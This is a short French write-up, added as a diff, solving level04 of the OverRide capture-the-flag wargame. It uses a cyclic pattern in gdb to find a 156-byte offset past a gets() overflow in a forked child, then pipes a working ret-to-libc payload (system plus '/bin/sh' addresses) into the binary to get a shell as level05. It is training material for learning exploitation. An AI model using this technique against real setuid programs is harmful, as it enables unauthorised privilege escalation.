@@ -1,0 +1,63 @@
+Solution :
+
+on vois que le prgramme fork est utilise gets dans le child process
+gets n'est pas securisé et peu segfault
+grace a l'option set follow-fork-mode child on va pouvoir suivre les child process avec gdb
+
+on va utiliser ce padding : 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5A
+d6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+level04@OverRide:~$ gdb ./level04 
+(gdb) set follow-fork-mode child
+(gdb) run 
+Starting program: /home/users/level04/level04 
+[New process 1780]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1792]
+0x41326641 in ?? ()
+
+
+Voyons l'etat des registre : 
+
+(gdb) info register
+eax            0x0	0
+ecx            0xf7fd08c4	-134412092
+edx            0xffffd670	-10640
+ebx            0x41386541	1094214977
+esp            0xffffd710	0xffffd710
+ebp            0x31664130	0x31664130
+esi            0x0	0
+edi            0x66413965	1715550565
+eip            0x41326641	0x41326641
+eflags         0x10282	[ SF IF RF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+
+eip a ete atteint on va pouvoir faire un ret to libc
+
+
+payload :
+
+(gdb) p &system
+$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+
+41326641 -> Reverse = 41663241 -> to Ascii = Af2A -> Offset = 156
+
+level04@OverRide:~$ python -c'print("a" * 156 + "\xd0\xae\xe6\xf7" + "----" + "\xec\x97\xf8\xf7")' > /tmp/lvl4 
+level04@OverRide:~$ cat /tmp/lvl4 - | ./level4
+bash: ./level4: No such file or directory
+level04@OverRide:~$ cat /tmp/lvl4 - | ./level04
+Give me some shellcode, k
+whoami
+level05
+
